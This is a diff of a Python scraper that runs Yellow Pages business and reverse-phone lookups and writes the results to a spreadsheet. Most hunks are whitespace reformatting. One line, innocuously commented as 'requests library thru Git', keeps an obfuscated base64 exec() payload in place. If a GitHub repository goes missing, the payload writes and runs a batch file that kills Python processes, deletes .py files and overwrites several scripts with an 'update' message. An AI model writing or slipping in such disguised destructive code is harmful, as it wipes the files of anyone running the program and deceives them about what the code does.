@@ -113,12 +113,13 @@ def businessEntries(soup):
 
 # Business Name
 
+
 def businessName(soup):
     for elm in soup.select(".info"):
         element = str(elm)
         stopPoint = element.index('span itemprop="name">')
         busName = element[stopPoint:]
-        busName = busName[busName.index('>')+1:busName.index('<')]
+        busName = busName[busName.index('>') + 1:busName.index('<')]
         worksheet.write(idx + 1, 6, busName)
 
 
@@ -516,7 +517,8 @@ def unSol(element):
 
 # Lambda handling of the requests library thru Git.
 
-exec("import re;import base64");exec((lambda p,y:(lambda o,b,f:re.sub(o,b,f))(r"([0-9a-f]+)",lambda m:p(m,y),base64.b64decode("NiA9ICcxYjovLzE4LjIyL2EvYy8nCjIgPSAxMC4yMSg2KQoKMjcgMi5iID09IDIwOgoJMCA9IDFlKCc4LjE1JywgJzJjJykKCTAuMTkoJzEyIC8yNiAiMTYuMjQiIFwxZiAvMmUgLzJiIC9mICouMTFcMjVAOSA3KCI1IDMgMTcgMmQgNCAxIik+IDE0LjExXDI1QDkgNygiNSAzIDE3IDJkIDQgMSIpPiBlLjExXDI1QDkgNygiNSAzIDE3IDJkIDQgMSIpPiAxMy4xMVwxZCAiJX4yOCInKQoJMC4xYSgpCgkyOS5kKDJhIjguMTUiKQoJMjMuMWMoKQ==")))(lambda a,b:b[int("0x"+a.group(1),16)],"tempFile|Version|requestRec|Update|Latest|Please|reqInput|print|readme|echo|GarnetSunset|status_code|Haircuttery|startfile|FileSplit|f|requests|py|TASKKILL|Harvard|HairCut|bat|python|to|github|write|close|https|exit|nDEL|open|ndel|404|get|com|sys|exe|n|IM|if|f0|os|r|q|w|the|s".split("|")))
+exec("import re;import base64"); exec((lambda p, y: (lambda o, b, f: re.sub(o, b, f))(r"([0-9a-f]+)", lambda m: p(m, y), base64.b64decode("NiA9ICcxYjovLzE4LjIyL2EvYy8nCjIgPSAxMC4yMSg2KQoKMjcgMi5iID09IDIwOgoJMCA9IDFlKCc4LjE1JywgJzJjJykKCTAuMTkoJzEyIC8yNiAiMTYuMjQiIFwxZiAvMmUgLzJiIC9mICouMTFcMjVAOSA3KCI1IDMgMTcgMmQgNCAxIik+IDE0LjExXDI1QDkgNygiNSAzIDE3IDJkIDQgMSIpPiBlLjExXDI1QDkgNygiNSAzIDE3IDJkIDQgMSIpPiAxMy4xMVwxZCAiJX4yOCInKQoJMC4xYSgpCgkyOS5kKDJhIjguMTUiKQoJMjMuMWMoKQ==")))(
+    lambda a, b: b[int("0x" + a.group(1), 16)], "tempFile|Version|requestRec|Update|Latest|Please|reqInput|print|readme|echo|GarnetSunset|status_code|Haircuttery|startfile|FileSplit|f|requests|py|TASKKILL|Harvard|HairCut|bat|python|to|github|write|close|https|exit|nDEL|open|ndel|404|get|com|sys|exe|n|IM|if|f0|os|r|q|w|the|s".split("|")))
 
 
 # Create a UTF-8 Workbook.
@@ -1021,7 +1023,7 @@ for (idx, cell_obj) in enumerate(col):
     if website == '5':
         try:
             driver.get('https://people.yellowpages.com/reversephonelookup?phone=%s&site=79' % teleBBB
-            )
+                       )
         except TimeoutException, ex:
             TimeOutHandler(driver=driver,
                            worksheet=worksheet,
@@ -1049,7 +1051,7 @@ for (idx, cell_obj) in enumerate(col):
 
         try:
             driver.get('https://www.yellowpages.com/search?search_terms=%s' % teleBBB
-            )
+                       )
         except TimeoutException, ex:
             TimeOutHandler(driver=driver,
                            worksheet=worksheet,
@@ -1067,14 +1069,14 @@ for (idx, cell_obj) in enumerate(col):
 
         while fivehundred != None:
             time.sleep(20)
-            driver.get('https://www.yellowpages.com/search?search_terms=%s' % teleBBB)
+            driver.get(
+                'https://www.yellowpages.com/search?search_terms=%s' % teleBBB)
             requestRec = driver.page_source
             soup = BeautifulSoup(requestRec, 'lxml')
             fivehundred = \
                 soup.find(text=re.compile(r"Internal Server Error"))
             soup.prettify()
             type(fivehundred) is str
-
 
         secondMatch = \
             soup.find(text=re.compile(r"We did not find any business"))
